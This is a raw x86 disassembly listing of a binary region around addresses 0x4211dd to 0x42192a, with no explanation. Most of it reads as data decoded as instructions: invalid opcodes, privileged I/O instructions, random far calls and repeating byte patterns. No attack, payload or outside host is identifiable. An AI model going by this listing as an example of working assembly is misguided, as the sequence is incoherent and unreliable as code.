  4211dd:	adc    edi,ebp
  4211df:	cmp    edx,edi
  4211e1:	out    dx,al
  4211e2:	pop    edi
  4211e3:	xchg   bx,ax
  4211e5:	push   0xd9da4e73
  4211ea:	sahf   
  4211eb:	int3   
  4211ec:	add    DWORD PTR [eax],eax
  4211ee:	popa   
  4211ef:	add    BYTE PTR [eax],al
  4211f1:	add    BYTE PTR [edi+0x6ba61f59],ah
  4211f7:	into   
  4211f8:	ds iret 
  4211fa:	call   FWORD PTR [ebx-0x739ad433]
  421200:	sub    dl,bl
  421202:	fsubr  DWORD PTR ds:0x604896fe
  421208:	repnz test eax,0x46b1d65e
  42120e:	jnp    0x42122e
  421210:	loop   0x421198
  421212:	jmp    0x24ccdfc9
  421217:	push   ds
  421218:	popf   
  421219:	fsubr  DWORD PTR [edi+0x7408191]
  42121f:	jmp    0x421210
  421221:	mov    esi,0x4cd27fe1
  421226:	mov    eax,ds:0x74a99853
  42122b:	std    
  42122c:	bound  edi,QWORD PTR [edi]
  42122e:	cli    
  42122f:	jo     0x42129c
  421231:	ret    
  421232:	push   0x91a7ee5c
  421237:	loopne 0x4211f8
  421239:	jl     0x42129d
  42123b:	xor    eax,0x907702f5
  421240:	mov    ecx,0x6180f21a
  421245:	push   0xffffffce
  421247:	sub    esi,eax
  421249:	jmp    0x4211ed
  42124b:	add    DWORD PTR [eax],0x40
  42124e:	mov    gs:0x15a360,al
  421254:	add    BYTE PTR [eax],al
  421256:	add    BYTE PTR [eax],al
  421258:	add    BYTE PTR [eax],al
  42125a:	pop    ds
  42125b:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421261:	sub    eax,esi
  421263:	add    BYTE PTR [edi+eax*2-0x56adef46],0xff
  42126b:	int3   
  42126c:	add    DWORD PTR [eax],eax
  42126e:	popa   
  42126f:	add    BYTE PTR [eax],al
  421271:	add    BYTE PTR ds:0x195cf763,cl
  421277:	jae    0x4212b5
  421279:	dec    esp
  42127a:	jecxz  0x4212ea
  42127c:	push   edx
  42127d:	out    dx,al
  42127e:	jns    0x42121b
  421280:	nop
  421281:	hlt    
  421282:	fmulp  st(6),st
  421284:	stc    
  421285:	xchg   esi,eax
  421286:	leave  
  421287:	push   esp
  421288:	enter  0x6848,0xe8
  42128c:	(bad)  
  42128d:	mov    dl,0x18
  42128f:	dec    ebp
  421290:	mov    bh,0x18
  421292:	stos   DWORD PTR es:[edi],eax
  421293:	xlat   BYTE PTR ds:[ebx]
  421294:	call   0x9e41:0x230beaf8
  42129b:	xchg   ebp,eax
  42129c:	(bad)  
  42129d:	and    eax,DWORD PTR [eax+0x1b7f3e00]
  4212a3:	(bad)  
  4212a5:	push   0x529ff627
  4212aa:	and    DWORD PTR [edx+0x4948a5b3],eax
  4212b0:	cmp    DWORD PTR [esi-0x7e],ebp
  4212b3:	(bad)  
  4212b4:	ins    DWORD PTR es:[edi],dx
  4212b5:	enter  0x555c,0x6a
  4212b9:	mov    ds:0xfd509da4,al
  4212be:	jl     0x4212be
  4212c0:	pop    ecx
  4212c1:	int3   
  4212c2:	fcom   DWORD PTR [edi+esi*2]
  4212c5:	lahf   
  4212c6:	div    BYTE PTR [edi-0x7e1458cf]
  4212cc:	call   0xeccf:0x19fc413a
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [eax],al
  4212d7:	add    BYTE PTR [eax],al
  4212d9:	add    BYTE PTR [edi],ch
  4212db:	and    al,0xf0
  4212dd:	aam    0xfb
  4212df:	aam    0x2f
  4212e1:	jmp    FWORD PTR [esi+0x33]
  4212e4:	je     0x42129c
  4212e6:	mov    ecx,0x600f15a5
  4212eb:	int    0x1
  4212ed:	add    BYTE PTR [ecx+0x0],ah
  4212f0:	add    BYTE PTR [eax],al
  4212f2:	int3   
  4212f3:	icebp  
  4212f4:	les    edx,FWORD PTR [ecx+0x6e282bc9]
  4212fa:	cmp    DWORD PTR gs:[eax+0x53],esi
  4212fe:	or     BYTE PTR [edx-0x71],dh
  421301:	lods   al,BYTE PTR ds:[esi]
  421302:	or     eax,0x513fd8f4
  421307:	sti    
  421308:	push   ebx
  421309:	pop    ss
  42130a:	pusha  
  42130b:	ds jge 0x4212cd
  42130e:	iret   
  42130f:	dec    esp
  421310:	inc    edi
  421311:	mov    ?,WORD PTR [ebp+0x7b]
  421314:	pop    es
  421315:	les    edi,FWORD PTR [esi-0x61]
  421318:	int3   
  421319:	pop    ebx
  42131a:	push   es
  42131b:	dec    eax
  42131c:	or     ebp,eax
  42131e:	or     al,0x60
  421320:	fwait
  421321:	(bad)  
  421322:	mov    ecx,0x5880f74c
  421327:	jno    0x42133a
  421329:	xchg   BYTE PTR [ecx+edi*1-0x55686220],al
  421330:	int3   
  421331:	sahf   
  421332:	repnz xor edi,DWORD PTR [esi+0x7d]
  421336:	push   es
  421337:	pushf  
  421338:	or     ecx,eax
  42133a:	(bad)  
  42133b:	jge    0x42136e
  42133d:	out    0xfe,eax
  42133f:	pop    edi
  421340:	xchg   edx,eax
  421341:	js     0x421325
  421343:	mov    al,ds:0xc4f91659
  421348:	pop    esp
  421349:	fdiv   DWORD PTR [eax]
  42134b:	test   BYTE PTR [ecx+0x49233fd],cl
  421351:	rcr    DWORD PTR ds:0x0,0x0
  421358:	add    BYTE PTR [eax],al
  42135a:	retf   0x76a0
  42135d:	dec    ebp
  42135e:	jle    0x42133f
  421360:	sti    
  421361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421362:	mov    bh,0x83
  421364:	dec    edi
  421365:	mov    ds:0xd6281187,al
  42136a:	ror    ebp,0x1
  42136d:	add    BYTE PTR [ecx+0x0],ah
  421370:	add    BYTE PTR [eax],al
  421372:	repnz in al,dx
  421374:	scas   eax,DWORD PTR es:[edi]
  421375:	adc    BYTE PTR [edi+eax*8+0x558a59df],0x87
  42137d:	pop    esi
  42137e:	pop    eax
  42137f:	xchg   BYTE PTR [eax+0x4b],ah
  421382:	vmfunc 
  421385:	jmp    0x42139e
  421387:	pop    ecx
  421388:	xchg   edi,eax
  421389:	add    BYTE PTR [edx],ch
  42138b:	push   0x40
  42138d:	fisttp WORD PTR [ecx+0x2f]
  421390:	in     al,dx
  421391:	push   ecx
  421392:	arpl   WORD PTR [eax],cx
  421394:	mov    cl,0x25
  421396:	mov    WORD PTR [ecx+0x5a],ds
  421399:	repz stc 
  42139b:	mov    edx,0x13b8ac50
  4213a0:	cmp    DWORD PTR [ebp+ebp*8-0x411c4afd],esi
  4213a7:	dec    edi
  4213a8:	out    dx,eax
  4213a9:	sub    DWORD PTR [ebx],esp
  4213ab:	mov    al,0x8b
  4213ad:	loopne 0x4213ad
  4213af:	or     al,0xa2
  4213b1:	xchg   ebp,eax
  4213b2:	xor    al,BYTE PTR [ecx]
  4213b4:	jo     0x421398
  4213b6:	ins    DWORD PTR es:[edi],dx
  4213b7:	and    eax,DWORD PTR [edi+0x4d]
  4213ba:	enter  0xfaa8,0x2b
  4213be:	cli    
  4213bf:	fbld   TBYTE PTR ds:0xa90bd65
  4213c5:	add    al,0x1b
  4213c7:	dec    esi
  4213c8:	aas    
  4213c9:	xchg   edx,eax
  4213ca:	rol    ebx,0xdc
  4213cd:	and    al,0x13
  4213cf:	xchg   DWORD PTR [ecx-0x67],ecx
  4213d2:	add    BYTE PTR ss:[eax],al
  4213d5:	add    BYTE PTR [eax],al
  4213d7:	add    BYTE PTR [eax],al
  4213d9:	add    dh,al
  4213db:	out    dx,al
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4213e4:	stc    
  4213e5:	stc    
  4213e6:	bound  ebx,QWORD PTR [eax-0x31dd9fbb]
  4213ec:	add    DWORD PTR [eax],eax
  4213ee:	popa   
  4213ef:	add    BYTE PTR [eax],al
  4213f1:	add    BYTE PTR [edi-0x5a],bh
  4213f4:	into   
  4213f5:	pop    edi
  4213f6:	and    esp,ebx
  4213f8:	neg    DWORD PTR [esi+eiz*8]
  4213fb:	imul   edx,DWORD PTR [ecx],0xf4d82698
  421401:	push   eax
  421402:	rol    dh,0x1a
  421405:	js     0x421475
  421407:	sar    BYTE PTR [eax-0x4],cl
  42140a:	push   ebp
  42140b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42140c:	cwde   
  42140d:	hlt    
  42140e:	xchg   ebp,eax
  42140f:	test   BYTE PTR [ecx+0x4ccc6241],al
  421415:	mov    ecx,0x49cf89f2
  42141a:	cmp    ebx,edx
  42141c:	push   esp
  42141d:	mov    edi,0x26ddc706
  421422:	jmp    0x421405
  421424:	ins    DWORD PTR es:[edi],dx
  421425:	lock sbb ebp,ebp
  421428:	mov    ebp,0xc393b7cf
  42142d:	jl     0x421451
  42142f:	daa    
  421430:	mov    dl,BYTE PTR [eax+eax*1-0x39]
  421434:	aad    0x83
  421436:	jmp    0x421464
  421438:	and    DWORD PTR [edi-0x6c48ad5b],ecx
  42143e:	pop    esi
  42143f:	je     0x421484
  421441:	cli    
  421442:	ins    DWORD PTR es:[edi],dx
  421443:	xchg   ebx,eax
  421444:	sbb    eax,0x55d40fd6
  421449:	sbb    al,0x19
  42144b:	xchg   edi,eax
  42144c:	(bad)  
  42144d:	mov    edi,0x86cd2c71
  421452:	dec    ebp
  421453:	add    BYTE PTR [eax],al
  421455:	add    BYTE PTR [eax],al
  421457:	add    BYTE PTR [eax],al
  421459:	add    BYTE PTR [edx+0x34],dl
  42145c:	inc    eax
  42145d:	gs data16 jne 0x4214d8
  421461:	aaa    
  421462:	push   0x276a4e09
  421467:	ins    DWORD PTR es:[edi],dx
  421468:	icebp  
  421469:	jae    0x4213ee
  42146b:	into   
  42146c:	add    DWORD PTR [eax],eax
  42146e:	popa   
  42146f:	add    BYTE PTR [eax],al
  421471:	add    dl,bl
  421473:	dec    edi
  421474:	jb     0x4214af
  421476:	push   0xd0e136f3
  42147b:	in     al,0x77
  42147d:	jmp    0xb816576b
  421482:	and    ecx,edi
  421484:	fadd   DWORD PTR [edx]
  421486:	adc    DWORD PTR [edi+ebx*1+0x47],0x2bebcbca
  42148e:	xor    eax,0x32d3a548
  421493:	and    edi,DWORD PTR [ebp-0x7c]
  421496:	xchg   edx,eax
  421497:	sbb    DWORD PTR [esi+eiz*1],edx
  42149a:	xor    ebp,DWORD PTR [ebp+0x17]
  42149d:	mov    esp,DWORD PTR [eax+0x7a54e04]
  4214a3:	aaa    
  4214a4:	push   esp
  4214a5:	sub    BYTE PTR [esi+0x28d98773],al
  4214ab:	inc    edi
  4214ac:	xor    al,0xb9
  4214ae:	call   0xdabaa5c8
  4214b3:	nop
  4214b4:	and    BYTE PTR [edx+0x42],al
  4214b7:	push   ebp
  4214b8:	mov    dh,0x20
  4214ba:	into   
  4214bb:	bound  esi,QWORD PTR [edi+0x22]
  4214be:	mov    cl,0x2a
  4214c0:	outs   dx,DWORD PTR ds:[esi]
  4214c1:	mov    esp,0xd5e96c1c
  4214c6:	dec    eax
  4214c7:	pop    eax
  4214c8:	xor    BYTE PTR [edi+0x3a],dl
  4214cb:	xor    DWORD PTR [ebp+0x4a],edx
  4214ce:	fdivp  st(4),st
  4214d0:	iret   
  4214d1:	mov    bh,0xc6
  4214d3:	add    BYTE PTR [eax],al
  4214d5:	add    BYTE PTR [eax],al
  4214d7:	add    BYTE PTR [eax],al
  4214d9:	add    BYTE PTR [ecx+0x46],cl
  4214dc:	sub    BYTE PTR [eax],dh
  4214de:	das    
  4214df:	jle    0x42153a
  4214e1:	jg     0x4214a9
  4214e3:	imul   esi,eax,0xffffffd5
  4214e6:	push   edi
  4214e7:	lods   al,BYTE PTR ds:[esi]
  4214e8:	or     BYTE PTR [ebp+0x1e175],ah
  4214ee:	popa   
  4214ef:	add    BYTE PTR [eax],al
  4214f1:	add    BYTE PTR [eax+0x1b],cl
  4214f4:	mov    eax,0x6016703b
  4214f9:	xchg   ebp,eax
  4214fa:	inc    edx
  4214fb:	in     eax,dx
  4214fc:	call   0x46813191
  421501:	mov    DWORD PTR [edi+ebp*4],esi
  421504:	inc    esi
  421505:	vmovdqa XMMWORD PTR [eax+0x4b],xmm1
  42150a:	les    edx,FWORD PTR [eax+esi*4]
  42150d:	nop
  42150e:	les    esp,FWORD PTR [eax]
  421510:	neg    DWORD PTR fs:[edi-0x2cb63ca4]
  421517:	and    esp,DWORD PTR [edi]
  421519:	dec    edi
  42151a:	sbb    al,0x6
  42151c:	mov    eax,ds:0x58db0b5a
  421521:	inc    ebx
  421522:	pop    ebp
  421523:	xchg   ecx,eax
  421524:	adc    dh,BYTE PTR [ebp-0x24c8ae95]
  42152a:	popf   
  42152b:	sbb    al,ch
  42152d:	rcl    DWORD PTR fs:[esi],0x78
  421531:	gs jb  0x421532
  421534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421535:	jl     0x421598
  421537:	fwait
  421538:	jmp    0x4214e9
  42153a:	int3   
  42153b:	ficom  WORD PTR [ecx]
  42153d:	mov    ds:0xa871008b,al
  421542:	(bad)  [ebx]
  421544:	cmc    
  421545:	xor    BYTE PTR [eax+eax*8-0x76],dh
  421549:	repnz inc esp
  42154b:	scas   al,BYTE PTR es:[edi]
  42154c:	xchg   ebx,eax
  42154d:	int    0x3d
  42154f:	sub    BYTE PTR ds:0x23fd,al
  421555:	add    BYTE PTR [eax],al
  421557:	add    BYTE PTR [eax],al
  421559:	add    BYTE PTR [edi-0x3a],ah
  42155c:	and    dh,dh
  42155e:	mov    eax,ds:0xe7d7f7f6
  421563:	mov    eax,0x9d8bda72
  421568:	mov    al,0xcc
  42156a:	(bad)  
  42156b:	loope  0x42156e
  42156d:	add    BYTE PTR [ecx+0x0],ah
  421570:	add    BYTE PTR [eax],al
  421572:	cld    
  421573:	js     0x421579
  421575:	or     ah,BYTE PTR [eax]
  421577:	mov    ah,0xa9
  421579:	jge    0x421501
  42157b:	mov    bl,0x59
  42157d:	mov    cl,0x19
  42157f:	scas   al,BYTE PTR es:[edi]
  421580:	test   esi,eax
  421582:	mov    DWORD PTR [edx-0x2],ebx
  421585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421586:	xchg   esp,eax
  421587:	call   0x3d190242
  42158c:	mov    al,0x31
  42158e:	push   ebp
  42158f:	mov    DWORD PTR [ebp+ebx*4+0xf],edi
  421593:	adc    esp,edi
  421595:	and    al,BYTE PTR [ecx+0x4f]
  421598:	xor    ch,BYTE PTR [ebx]
  42159a:	adc    ebp,DWORD PTR [eax]
  42159c:	adc    DWORD PTR [edi+0x77c35f53],0x11
  4215a3:	jecxz  0x421593
  4215a5:	cmp    dh,BYTE PTR [esp+eiz*4-0x40a9d38]
  4215ac:	stos   BYTE PTR es:[edi],al
  4215ad:	inc    esi
  4215ae:	jecxz  0x4215f7
  4215b0:	popa   
  4215b1:	call   0xdfb8:0xd3967d3a
  4215b8:	xchg   BYTE PTR [ebx-0x7],al
  4215bb:	xor    al,0xd2
  4215bd:	push   eax
  4215be:	dec    eax
  4215bf:	ins    DWORD PTR es:[edi],dx
  4215c0:	push   ds
  4215c1:	stos   DWORD PTR es:[edi],eax
  4215c2:	xchg   esp,eax
  4215c3:	lea    ebx,[esi+0x60]
  4215c6:	mov    ebx,0x1e2da9a9
  4215cb:	adc    eax,0xc3180d18
  4215d0:	dec    eax
  4215d1:	pop    ss
  4215d2:	scas   al,BYTE PTR es:[edi]
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    BYTE PTR [eax],al
  4215d7:	add    BYTE PTR [eax],al
  4215d9:	add    bl,al
  4215db:	or     eax,0xefee66a6
  4215e0:	ret    
  4215e1:	lods   eax,DWORD PTR ds:[esi]
  4215e2:	sub    al,0xb8
  4215e4:	mov    ds:0x98637247,eax
  4215e9:	aaa    
  4215ea:	aaa    
  4215eb:	loop   0x4215ee
  4215ed:	add    BYTE PTR [ecx+0x0],ah
  4215f0:	add    BYTE PTR [eax],al
  4215f2:	jg     0x4215c5
  4215f4:	ja     0x421654
  4215f6:	(bad)  
  4215f7:	dec    ebp
  4215f8:	mov    ds:0x47f01daf,eax
  4215fd:	sbb    ecx,esi
  4215ff:	and    al,0x3f
  421601:	push   ecx
  421602:	add    eax,DWORD PTR [ebp+0x45]
  421605:	mov    ebx,0x16be3620
  42160a:	inc    eax
  42160b:	add    eax,0x4aa91fe5
  421610:	mov    dh,0x93
  421612:	inc    edi
  421613:	sar    DWORD PTR [ebp-0x5f916daf],0x6c
  42161a:	sbb    ebx,edx
  42161c:	cmp    BYTE PTR [esi+0x2c],dl
  42161f:	or     edi,eax
  421621:	stos   DWORD PTR es:[edi],eax
  421622:	dec    ebp
  421623:	pop    edi
  421624:	mov    esp,0x2eabd307
  421629:	xor    BYTE PTR [ecx+ebx*8+0x6c],ch
  42162d:	and    eax,0xef03f222
  421632:	pusha  
  421633:	enter  0x6da7,0x35
  421637:	aad    0x37
  421639:	push   ebp
  42163a:	test   al,0x95
  42163c:	call   0x3255:0xa408fdf4
  421643:	or     BYTE PTR [eax*8-0x4201ddb0],0xf9
  42164b:	cmp    ebp,DWORD PTR [esi+0x79ae054b]
  421651:	push   eax
  421652:	add    al,BYTE PTR [eax]
  421654:	add    BYTE PTR [eax],al
  421656:	add    BYTE PTR [eax],al
  421658:	add    BYTE PTR [eax],al
  42165a:	fld    st(2)
  42165c:	add    eax,0xddcf1f49
  421661:	ror    al,cl
  421663:	outs   dx,DWORD PTR ds:[esi]
  421664:	clc    
  421665:	ror    al,cl
  421667:	mov    bl,0x61
  421669:	int3   
  42166a:	cwde   
  42166b:	loop   0x42166e
  42166d:	add    BYTE PTR [ecx+0x0],ah
  421670:	add    BYTE PTR [eax],al
  421672:	xchg   ebp,ebp
  421674:	inc    eax
  421675:	pushf  
  421676:	cmp    bh,BYTE PTR [ebp-0x77f5f23f]
  42167c:	cmp    DWORD PTR [ecx+0x3f],ebp
  42167f:	push   ss
  421680:	lea    eax,[eax-0x56fcb7e3]
  421686:	xor    dl,ah
  421688:	mov    ecx,0x3a44da5e
  42168d:	sub    eax,0x73b59495
  421692:	mov    ebx,0xc32f7141
  421697:	dec    esp
  421698:	or     DWORD PTR [ebp+0x4c2cee98],0x7f16f9e8
  4216a2:	pop    es
  4216a3:	add    al,0xa
  4216a5:	out    dx,al
  4216a6:	aaa    
  4216a7:	leave  
  4216a8:	add    al,0xf1
  4216aa:	dec    eax
  4216ab:	push   0xffffffc4
  4216ad:	out    dx,eax
  4216ae:	mov    ebp,esp
  4216b0:	and    al,0xba
  4216b2:	scas   al,BYTE PTR es:[edi]
  4216b3:	jg     0x42172d
  4216b5:	or     eax,0x1b3d9d5d
  4216ba:	retf   
  4216bb:	jecxz  0x421641
  4216bd:	and    BYTE PTR [ebp+0x31],ch
  4216c0:	push   edx
  4216c1:	add    edi,ecx
  4216c3:	sub    BYTE PTR [ebp+0x44],ch
  4216c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216c7:	int    0x39
  4216c9:	shl    bh,0x21
  4216cc:	hlt    
  4216cd:	sbb    edx,DWORD PTR [ebx-0x37]
  4216d0:	(bad)  
  4216d1:	xor    cl,BYTE PTR [edx+0x0]
  4216d4:	add    BYTE PTR [eax],al
  4216d6:	add    BYTE PTR [eax],al
  4216d8:	add    BYTE PTR [eax],al
  4216da:	popa   
  4216db:	pop    edi
  4216dc:	lock (bad) 
  4216de:	(bad)  
  4216df:	out    dx,eax
  4216e0:	repz pop edi
  4216e2:	mov    dl,0xc5
  4216e4:	ret    
  4216e5:	in     eax,dx
  4216e6:	or     ah,BYTE PTR [ebx-0x1d06cffb]
  4216ec:	add    DWORD PTR [eax],eax
  4216ee:	or     al,BYTE PTR [eax]
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	cmpps  xmm4,XMMWORD PTR [bp-0x7f],0xbe
  4216f8:	or     eax,0x30287
	...
  421709:	add    BYTE PTR [eax],al
  42170b:	nop
  42170c:	inc    edx
  42170d:	add    BYTE PTR [eax+edx*4],al
  421710:	inc    edx
  421711:	add    BYTE PTR [eax],cl
  421713:	nop
  421714:	inc    edx
  421715:	add    BYTE PTR [eax+edx*4],cl
  421718:	inc    edx
  421719:	add    BYTE PTR [eax],dl
  42171b:	nop
  42171c:	inc    edx
  42171d:	add    BYTE PTR [eax+edx*4],dl
  421720:	inc    edx
  421721:	add    BYTE PTR [eax],bl
  421723:	nop
  421724:	inc    edx
  421725:	add    BYTE PTR [eax+edx*4],bl
  421728:	inc    edx
  421729:	add    BYTE PTR [eax],al
  42172b:	mov    al,ds:0xa0040042
  421730:	inc    edx
  421731:	add    BYTE PTR [eax],cl
  421733:	mov    al,ds:0xa00c0042
  421738:	inc    edx
  421739:	add    BYTE PTR [eax],dl
  42173b:	mov    al,ds:0xa0140042
  421740:	inc    edx
  421741:	add    BYTE PTR [eax],bl
  421743:	mov    al,ds:0xa01c0042
  421748:	inc    edx
  421749:	add    BYTE PTR [eax],al
  42174b:	mov    al,0x42
  42174d:	add    BYTE PTR [eax+esi*4],al
  421750:	inc    edx
  421751:	add    BYTE PTR [eax],cl
  421753:	mov    al,0x42
  421755:	add    BYTE PTR [eax+esi*4],cl
  421758:	inc    edx
  421759:	add    BYTE PTR [eax],dl
  42175b:	mov    al,0x42
  42175d:	add    BYTE PTR [eax+esi*4],dl
  421760:	inc    edx
  421761:	add    BYTE PTR [eax],bl
  421763:	mov    al,0x42
  421765:	add    BYTE PTR [eax+esi*4],bl
  421768:	inc    edx
  421769:	add    BYTE PTR [eax+0x66],bh
  42176c:	ins    BYTE PTR es:[edi],dx
  42176d:	jp     0x4217c6
  42176f:	jbe    0x4217b8
  421771:	ja     0x4217b6
  421773:	js     0x4217bd
  421775:	jno    0x4217da
  421777:	inc    edx
  421778:	inc    bx
  42177a:	push   ebp
  42177b:	jno    0x4217f3
  42177d:	ja     0x4217e6
  42177f:	dec    edi
  421780:	dec    esp
  421781:	dec    ebp
  421782:	inc    edx
  421783:	jno    0x4217f6
  421785:	jae    0x4217da
  421787:	push   eax
  421788:	arpl   WORD PTR [ebx+0x32],dx
  42178b:	sbb    eax,DWORD PTR [edx+0x0]
  42178e:	cmp    bl,BYTE PTR [ebx]
  421790:	inc    edx
  421791:	add    dl,dl
  421793:	sbb    DWORD PTR [edx+0x0],eax
  421796:	out    dx,eax
  421797:	or     esi,DWORD PTR [edx+0x304e790e]
  42179d:	dec    esi
  42179e:	xchg   DWORD PTR [edi+0x3d],ecx
  4217a1:	dec    esi
  4217a2:	scas   eax,DWORD PTR es:[edi]
  4217a3:	dec    edi
  4217a4:	ds dec esi
  4217a6:	js     0x4217f6
  4217a8:	cmp    ecx,DWORD PTR [esi-0x64]
  4217ab:	dec    edi
  4217ac:	inc    esp
  4217ad:	dec    esi
  4217ae:	jae    0x4217fe
  4217b0:	inc    ecx
  4217b1:	dec    esi
  4217b2:	xor    BYTE PTR [esi+0x40],cl
  4217b5:	dec    esi
  4217b6:	pop    esp
  4217b7:	pop    ebp
  4217b8:	pop    edi
  4217b9:	push   edx
  4217ba:	cmp    DWORD PTR [esi+0x79],ecx
  4217bd:	dec    esi
  4217be:	xor    BYTE PTR [esi-0x79],cl
  4217c1:	dec    edi
  4217c2:	cmp    eax,0x3e4faf4e
  4217c7:	dec    esi
  4217c8:	js     0x421818
  4217ca:	cmp    ecx,DWORD PTR [esi-0x64]
  4217cd:	dec    edi
  4217ce:	inc    esp
  4217cf:	dec    esi
  4217d0:	mov    DWORD PTR [edi+0x41],ecx
  4217d3:	dec    esi
  4217d4:	xor    BYTE PTR [esi+0x40],cl
  4217d7:	dec    esi
  4217d8:	pop    esp
  4217d9:	ins    DWORD PTR es:[edi],dx
  4217da:	pop    edi
  4217db:	bound  edi,QWORD PTR [ecx]
  4217dd:	dec    esi
  4217de:	jns    0x42182e
  4217e0:	xor    BYTE PTR [esi-0x80],cl
  4217e3:	dec    edi
  4217e4:	cmp    eax,0x394e734e
  4217e9:	dec    esi
  4217ea:	mov    ds:0x304e3a4f,al
  4217ef:	dec    esi
  4217f0:	inc    esi
  4217f1:	dec    esi
  4217f2:	pop    esp
  4217f3:	jge    0x421854
  4217f5:	jb     0x421866
  4217f7:	sub    BYTE PTR [esi-0x7d],0x7e
  4217fb:	xchg   ebx,eax
  4217fc:	jns    0x42178e
  4217fe:	aas    
  4217ff:	dec    esi
  421800:	test   BYTE PTR [edi+0x30],cl
  421803:	dec    esi
  421804:	test   BYTE PTR [edi+0x3c],cl
  421807:	dec    esi
  421808:	mov    ds:0x734e394f,al
  42180d:	dec    esi
  42180e:	inc    ebp
  42180f:	dec    esi
  421810:	xor    BYTE PTR [esi+0x44],cl
  421813:	dec    esi
  421814:	pop    esp
  421815:	lea    ebx,[edi-0x7e]
  421818:	outs   dx,DWORD PTR ds:[esi]
  421819:	xchg   edx,eax
  42181a:	outs   dx,BYTE PTR ds:[esi]
  42181b:	xchg   ebx,eax
  42181c:	jle    0x4217c1
  42181e:	jns    0x4217c0
  421820:	aas    
  421821:	dec    esi
  421822:	test   BYTE PTR [edi+0x30],cl
  421825:	dec    esi
  421826:	test   BYTE PTR [edi+0x3c],cl
  421829:	dec    esi
  42182a:	mov    ds:0x894e394f,al
  42182f:	dec    edi
  421830:	inc    ebp
  421831:	dec    esi
  421832:	xor    BYTE PTR [esi+0x44],cl
  421835:	dec    esi
  421836:	pop    esp
  421837:	popf   
  421838:	pop    edi
  421839:	xchg   edx,eax
  42183a:	outs   dx,DWORD PTR ds:[esi]
  42183b:	mov    ds:0xb37ea36e,al
  421840:	jns    0x4217f2
  421842:	aas    
  421843:	dec    esi
  421844:	mov    cs,WORD PTR [edi+0x30]
  421847:	dec    esi
  421848:	lods   al,BYTE PTR ds:[esi]
  421849:	dec    edi
  42184a:	cmp    eax,0x394e734e
  42184f:	dec    esi
  421850:	mov    eax,ds:0x304e3a4f
  421855:	dec    esi
  421856:	inc    esp
  421857:	dec    esi
  421858:	pop    esp
  421859:	lods   eax,DWORD PTR ds:[esi]
  42185a:	pop    edi
  42185b:	mov    ds:0xb36eb26f,al
  421860:	jle    0x421825
  421862:	jns    0x421824
  421864:	aas    
  421865:	dec    esi
  421866:	mov    cs,WORD PTR [edi+0x30]
  421869:	dec    esi
  42186a:	lods   al,BYTE PTR ds:[esi]
  42186b:	dec    edi
  42186c:	cmp    eax,0x394e7e4e
  421871:	dec    esi
  421872:	lahf   
  421873:	dec    edi
  421874:	cmp    ecx,DWORD PTR [esi+0x30]
  421877:	dec    esi
  421878:	inc    ebp
  421879:	dec    esi
  42187a:	pop    esp
  42187b:	mov    ebp,0xc26fb25f
  421880:	outs   dx,BYTE PTR ds:[esi]
  421881:	ret    
  421882:	jle    0x421857
  421884:	jns    0x421856
  421886:	aas    
  421887:	dec    esi
  421888:	mov    cs,WORD PTR [edi+0x30]
  42188b:	dec    esi
  42188c:	lods   al,BYTE PTR ds:[esi]
  42188d:	dec    edi
  42188e:	cmp    eax,0x394f804e
  421893:	dec    esi
  421894:	lods   al,BYTE PTR ds:[esi]
  421895:	dec    edi
  421896:	cmp    cl,BYTE PTR [esi+0x30]
  421899:	dec    esi
  42189a:	inc    esi
  42189b:	dec    esi
  42189c:	pop    esp
  42189d:	int    0x5f
  42189f:	ret    0xd26f
  4218a2:	outs   dx,BYTE PTR ds:[esi]
  4218a3:	sar    DWORD PTR [esi-0x1d],cl
  4218a6:	jns    0x421888
  4218a8:	aas    
  4218a9:	dec    esi
  4218aa:	mov    cs,WORD PTR [edi+0x30]
  4218ad:	dec    esi
  4218ae:	lods   al,BYTE PTR ds:[esi]
  4218af:	dec    edi
  4218b0:	cmp    eax,0x394f834e
  4218b5:	dec    esi
  4218b6:	mov    ds:0x304e3a4f,al
  4218bb:	dec    esi
  4218bc:	inc    esp
  4218bd:	dec    esi
  4218be:	pop    esp
  4218bf:	fstp   QWORD PTR [edi-0x2e]
  4218c2:	outs   dx,DWORD PTR ds:[esi]
  4218c3:	loop   0x421933
  4218c5:	jecxz  0x421945
  4218c7:	repz jns 0x4218ba
  4218ca:	aas    
  4218cb:	dec    esi
  4218cc:	lea    ecx,[edi+0x30]
  4218cf:	dec    esi
  4218d0:	lahf   
  4218d1:	dec    edi
  4218d2:	cmp    eax,0x3c4fa04e
  4218d7:	dec    esi
  4218d8:	xor    BYTE PTR [esi+0x3f],cl
  4218db:	dec    esi
  4218dc:	pop    esp
  4218dd:	in     eax,dx
  4218de:	pop    edi
  4218df:	loop   0x421950
  4218e1:	repnz outs dx,BYTE PTR ds:[esi]
  4218e3:	repz jle 0x4218e9
  4218e6:	jns    0x4218e8
  4218e8:	jle    0x4218fd
  4218ea:	jns    0x4218fc
  4218ec:	cmp    al,0x4e
  4218ee:	jg     0x42193e
  4218f0:	xor    BYTE PTR [esi-0x65],cl
  4218f3:	dec    edi
  4218f4:	xor    cl,BYTE PTR [esi-0x80]
  4218f7:	dec    edi
  4218f8:	cmp    al,0x4e
  4218fa:	lods   eax,DWORD PTR ds:[esi]
  4218fb:	dec    edi
  4218fc:	cmp    ecx,DWORD PTR [esi+0x30]
  4218ff:	dec    esi
  421900:	inc    ebp
  421901:	dec    esi
  421902:	pop    esp
  421903:	or     eax,0x126f025f
  421908:	outs   dx,BYTE PTR ds:[esi]
  421909:	adc    edi,DWORD PTR [esi+0x23]
  42190c:	jns    0x42192e
  42190e:	aas    
  42190f:	dec    esi
  421910:	add    BYTE PTR [eax],al
  421912:	call   0x4219:0x8e004217
  421919:	add    BYTE PTR [esi+0x3e004219],dl
  42191f:	sbb    eax,DWORD PTR [edx+0x0]
  421922:	stos   BYTE PTR es:[edi],al
  421923:	sbb    al,BYTE PTR [edx+0x0]
  421926:	sbb    eax,DWORD PTR cs:[edx+0x0]
  42192a:	jbe    0x421945
